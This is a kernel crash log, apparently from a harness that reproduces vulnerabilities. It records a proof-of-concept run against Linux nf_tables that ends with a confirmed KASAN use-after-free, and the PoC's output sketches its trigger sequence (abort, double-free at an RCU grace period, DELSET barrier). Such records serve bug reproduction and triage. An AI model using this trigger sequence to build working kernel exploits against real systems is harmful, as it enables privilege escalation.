[    3.388645] RIP: 0033:0x44f933
[    3.389035] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d f1 59 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    3.391309] RSP: 002b:00007fffef608028 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    3.392267] RAX: ffffffffffffffda RBX: 0000000000a46700 RCX: 000000000044f933
[    3.393203] RDX: 00000000000001bc RSI: 0000000000a366f0 RDI: 0000000000000003
[    3.394009] RBP: 0000000000a366d0 R08: 000000000048fd88 R09: 000000000000000c
[    3.394807] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000000001bc
[    3.395603] R13: 000000000048e12b R14: 0000000000a366d0 R15: 000000000048e105
[    3.396436]  </TASK>
[    3.396751] 
[    3.396991] Allocated by task 61:
[    3.397467]  kasan_save_stack+0x33/0x60
[    3.397919]  kasan_set_track+0x25/0x30
[    3.398395]  __kasan_kmalloc+0x8f/0xa0
[    3.398928]  __kmalloc+0x59/0x160
[    3.399396]  nft_set_elem_init+0xbe/0x590
[    3.400134]  nft_add_set_elem+0x1386/0x3170
[    3.400882]  nf_tables_newsetelem+0x4f7/0x910
[    3.401613]  nfnetlink_rcv_batch+0x129a/0x1fc0
[    3.402340]  nfnetlink_rcv+0x2df/0x360
[    3.402959]  netlink_unicast+0x588/0x7f0
[    3.403731]  netlink_sendmsg+0x7b7/0xc60
[    3.404368]  sock_sendmsg+0x13d/0x180
[    3.404904]  __sys_sendto+0x1eb/0x2b0
[    3.405518]  __x64_sys_sendto+0xdb/0x1b0
[    3.406200]  do_syscall_64+0x3b/0x90
[    3.407134]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.407944] 
[    3.408190] Freed by task 0:
[    3.408582]  kasan_save_stack+0x33/0x60
[    3.409176]  kasan_set_track+0x25/0x30
[    3.409637]  kasan_save_free_info+0x2b/0x50
[    3.410115]  __kasan_slab_free+0x10a/0x180
[    3.410612]  __kmem_cache_free+0x82/0x1c0
[    3.411139]  nft_trans_gc_trans_free+0x2fd/0x4a0
[    3.411681]  rcu_core+0x5e8/0x18b0
[    3.412080]  __do_softirq+0x1bf/0x5b5
[    3.412558] 
[    3.412731] The buggy address belongs to the object at ffff888103a50b00
[    3.412731]  which belongs to the cache kmalloc-128 of size 128
[    3.414229] The buggy address is located 27 bytes inside of
[    3.414229]  freed 128-byte region [ffff888103a50b00, ffff888103a50b80)
[    3.416222] 
[    3.416642] The buggy address belongs to the physical page:
[    3.417791] page:000000000f4066da refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x103a50
[    3.419205] flags: 0x200000000000200(slab|node=0|zone=2)
[    3.419722] page_type: 0xffffffff()
[    3.420178] raw: 0200000000000200 ffff8881000418c0 dead000000000122 0000000000000000
[    3.421202] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    3.422135] page dumped because: kasan: bad access detected
[    3.422863] 
[    3.423110] Memory state around the buggy address:
[    3.423643]  ffff888103a50a00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.424429]  ffff888103a50a80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.425266] >ffff888103a50b00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.426195]                             ^
[    3.426662]  ffff888103a50b80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.427460]  ffff888103a50c00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.428240] ==================================================================
[    3.429106] Disabling lock debugging due to kernel taint
    [!] trigger-abort ack seq=23 err=2 (No such file or directory)
    [drain trigger-abort] acks=3 errs=1
[*] trigger sent — expect msg C ack=ENOENT, abort fires, double-free of 0x58 at next RCU grace
[*] DELSET rbset (sync barrier for in-flight gc trans)
    [drain delset] acks=1 errs=0
    [dump] nlmsg_type=0x0002 len=60 flags=0x0 seq=28
    [dump err] err=2
[*] GETSETELEM dump: 1 msgs total, 0 NEWSETELEM-typed, done=0, err=1
[+] poc finished
[    4.253670] poc (61) used greatest stack depth: 26128 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    5.619811] ACPI: PM: Preparing to enter system sleep state S5
[    5.620743] reboot: Power down
CONFIRMED: KASAN_UAF
